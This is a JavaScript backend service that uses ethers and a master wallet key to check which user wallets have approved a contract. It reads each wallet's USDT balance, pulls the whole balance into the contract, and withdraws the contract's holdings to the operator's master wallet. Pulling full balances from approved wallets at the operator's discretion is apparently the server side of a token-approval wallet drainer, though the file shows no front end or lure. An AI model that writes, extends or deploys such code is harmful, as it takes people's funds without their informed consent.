// backend/src/services/contract.service.js
const { ethers } = require('ethers');
const dotenv = require('dotenv');
const path = require('path');
const fs = require('fs');

dotenv.config();

class ContractService {
    constructor() {
        // Validate required environment variables for transaction operations
        this.initialized = false;
        this.provider = null;
        this.wallet = null;
        this.contract = null;
        this.contractABI = [];
        
        try {
            if (!process.env.RPC_URL) {
                console.warn('⚠️ RPC_URL not found');
                return;
            }
            
            this.provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
            
            // Only initialize wallet and contract for transaction operations if master key exists
            if (process.env.MASTER_WALLET_PRIVATE_KEY && process.env.CONTRACT_ADDRESS) {
                this.wallet = new ethers.Wallet(process.env.MASTER_WALLET_PRIVATE_KEY, this.provider);
                
                // Load contract ABI
                this.loadContractABI();
                
                if (this.contractABI && this.contractABI.length > 0) {
                    this.contract = new ethers.Contract(
                        process.env.CONTRACT_ADDRESS,
                        this.contractABI,
                        this.wallet
                    );
                    this.initialized = true;
                    console.log('✅ Contract service initialized');
                } else {
                    console.warn('⚠️ Contract ABI not loaded, transaction operations will not work');
                }
            } else {
                console.log('ℹ️ Contract service initialized for read-only operations only');
            }
        } catch (error) {
            console.error('❌ Error initializing contract service:', error.message);
        }
    }

    // Load contract ABI with proper error handling
    loadContractABI() {
        try {
            // Try multiple possible paths
            const possiblePaths = [
                path.join(__dirname, '../../smart-contracts/artifacts/abi.json'),
                path.join(__dirname, '../../../smart-contracts/artifacts/abi.json'),
                path.join(__dirname, '../smart-contracts/artifacts/abi.json'),
                path.join(__dirname, 'abi.json')
            ];
            
            for (const abiPath of possiblePaths) {
                if (fs.existsSync(abiPath)) {
                    this.contractABI = require(abiPath);
                    console.log(`✅ Contract ABI loaded from: ${abiPath}`);
                    return;
                }
            }
            
            console.log('⚠️ Contract ABI file not found, using empty ABI');
            this.contractABI = [];
        } catch (error) {
            console.error('❌ Error loading contract ABI:', error.message);
            this.contractABI = [];
        }
    }

    // In the getWalletUSDTBalance method, replace with this enhanced version:

async getWalletUSDTBalance(walletAddress) {
    console.log('=== DEBUG: getWalletUSDTBalance START ===');
    console.log('Wallet address:', walletAddress);
    console.log('USDT_CONTRACT_ADDRESS from env:', process.env.USDT_CONTRACT_ADDRESS);
    console.log('Provider available:', !!this.provider);
    
    try {
        // Use environment variable first
        const usdtAddress = process.env.USDT_CONTRACT_ADDRESS;
        
        if (!usdtAddress) {
            console.warn('USDT_CONTRACT_ADDRESS not set in environment');
            return '0';
        }
        
        console.log('Using USDT contract address:', usdtAddress);
        
        // Use existing provider
        const providerToUse = this.provider;
        
        if (!providerToUse) {
            console.warn('No provider available for balance query');
            return '0';
        }
        
        console.log('Provider is available, creating contract instance');
        
        const usdtContract = new ethers.Contract(
            usdtAddress,
            ['function balanceOf(address account) external view returns (uint256)'],
            providerToUse
        );
        
        console.log('Calling balanceOf function...');
        const balance = await usdtContract.balanceOf(walletAddress);
        console.log('Raw balance result:', balance.toString());
        
        // Try both 18 and 6 decimals
        let formattedBalance = '0';
        const balanceBN = BigInt(balance.toString());
        
        // Try 18 decimals first
        formattedBalance = ethers.formatUnits(balance, 18);
        console.log('Formatted balance (18 decimals):', formattedBalance);
        
        // If it's 0 with 18 decimals but raw balance > 0, try 6 decimals
        if (parseFloat(formattedBalance) === 0 && balanceBN > 0) {
            formattedBalance = ethers.formatUnits(balance, 6);
            console.log('Formatted balance (6 decimals, fallback):', formattedBalance);
        }
        
        console.log('Final formatted balance:', formattedBalance);
        console.log('=== DEBUG: getWalletUSDTBalance END ===');
        
        return formattedBalance;
    } catch (error) {
        console.error('Error getting wallet balance for address', walletAddress, ':', error.message);
        console.error('Error stack:', error.stack);
        return '0';
    }
}


    async isWalletApproved(walletAddress) {
        if (!this.initialized) {
            console.warn('Contract service not initialized for transactions');
            return false;
        }
        
        try {
            return await this.contract.approvedWallets(walletAddress);
        } catch (error) {
            console.error('Error checking wallet approval:', error);
            return false;
        }
    }

    // Pull USDT from wallet to contract
    async pullUSDTFromWallet(walletAddress) {
        if (!this.initialized) {
            return {
                success: false,
                error: 'Contract service not initialized for transactions'
            };
        }
        
        try {
            console.log('Pulling USDT from wallet:', walletAddress);
            
            // Check if wallet has USDT balance
            const balance = await this.getWalletUSDTBalance(walletAddress);
            if (parseFloat(balance) <= 0) {
                return {
                    success: false,
                    error: 'Wallet has no USDT balance to pull'
                };
            }
            
            // Execute the pull
            const tx = await this.contract.pullUSDTFromWallet(walletAddress, {
                gasLimit: 300000,
                gasPrice: await this.provider.getFeeData().then(feeData => feeData.gasPrice)
            });
            
            // Wait for transaction confirmation with timeout
            const receipt = await Promise.race([
                tx.wait(),
                new Promise((resolve, reject) => 
                    setTimeout(() => reject(new Error('Transaction confirmation timeout')), 60000)
                )
            ]);
            
            // Get the amount pulled from the event
            let amount = '0';
            if (receipt.logs && receipt.logs.length > 0) {
                try {
                    // Parse the USDTPulled event
                    const eventInterface = new ethers.Interface([
                        "event USDTPulled(address indexed from, uint256 amount)"
                    ]);
                    
                    for (const log of receipt.logs) {
                        try {
                            const parsedLog = eventInterface.parseLog(log);
                            if (parsedLog && parsedLog.name === 'USDTPulled') {
                                amount = ethers.formatUnits(parsedLog.args.amount, 18);
                                break;
                            }
                        } catch (e) {
                            // Continue to next log if parsing fails
                            console.log('Log parsing failed:', e.message);
                        }
                    }
                } catch (e) {
                    console.log('Could not parse event, using default amount');
                }
            }
            
            return {
                success: true,
                txHash: tx.hash,
                amount: amount
            };
        } catch (error) {
            console.error('Error during pull:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }

    // Implement the actual withdrawal function
    async withdrawUSDTToMaster() {
        if (!this.initialized) {
            return {
                success: false,
                error: 'Contract service not initialized for transactions'
            };
        }
        
        try {
            console.log('Executing withdrawal to master wallet...');
            
            // First check if contract has USDT balance
            const contractBalance = await this.getContractUSDTBalance();
            if (parseFloat(contractBalance) <= 0) {
                return {
                    success: false,
                    error: 'Contract has no USDT balance to withdraw'
                };
            }
            
            // Execute the withdrawal with proper gas settings
            const feeData = await this.provider.getFeeData();
            const tx = await this.contract.withdrawToMaster({
                gasLimit: 300000,
                gasPrice: feeData.gasPrice
            });
            
            console.log('Transaction sent:', tx.hash);
            
            // Wait for transaction confirmation with timeout
            const receipt = await Promise.race([
                tx.wait(),
                new Promise((resolve, reject) => 
                    setTimeout(() => reject(new Error('Transaction confirmation timeout after 60 seconds')), 60000)
                )
            ]);
            
            console.log('Transaction confirmed:', receipt);
            
            // Get the amount withdrawn from the event
            let amount = '0';
            if (receipt.logs && receipt.logs.length > 0) {
                try {
                    // Parse the USDTWithdrawn event
                    const eventInterface = new ethers.Interface([
                        "event USDTWithdrawn(address indexed to, uint256 amount)"
                    ]);
                    
                    for (const log of receipt.logs) {
                        try {
                            const parsedLog = eventInterface.parseLog(log);
                            if (parsedLog && parsedLog.name === 'USDTWithdrawn') {
                                amount = ethers.formatUnits(parsedLog.args.amount, 18);
                                break;
                            }
                        } catch (e) {
                            // Continue to next log if parsing fails
                            console.log('Log parsing failed:', e.message);
                        }
                    }
                } catch (e) {
                    console.log('Could not parse event, using default amount');
                }
            }
            
            // If no amount found in events, get contract balance before transaction
            if (parseFloat(amount) <= 0) {
                amount = contractBalance;
            }
            
            return {
                success: true,
                txHash: tx.hash,
                amount: amount
            };
        } catch (error) {
            console.error('Error during withdrawal:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }

    // Get contract USDT balance
    async getContractUSDTBalance() {
        if (!this.initialized) {
            console.warn('Contract service not initialized for transactions');
            // Try read-only approach
            try {
                if (!this.provider || !process.env.CONTRACT_ADDRESS) {
                    return '0';
                }
                
                const contract = new ethers.Contract(
                    process.env.CONTRACT_ADDRESS,
                    ['function getContractUSDT() external view returns (uint256)'],
                    this.provider
                );
                
                const balance = await contract.getContractUSDT();
                return ethers.formatUnits(balance, 18);
            } catch (error) {
                console.error('Error getting contract USDT balance (read-only):', error);
                return '0';
            }
        }
        
        try {
            const balance = await this.contract.getContractUSDT();
            return ethers.formatUnits(balance, 18);
        } catch (error) {
            console.error('Error getting contract USDT balance:', error);
            return '0';
        }
    }
}

module.exports = new ContractService();

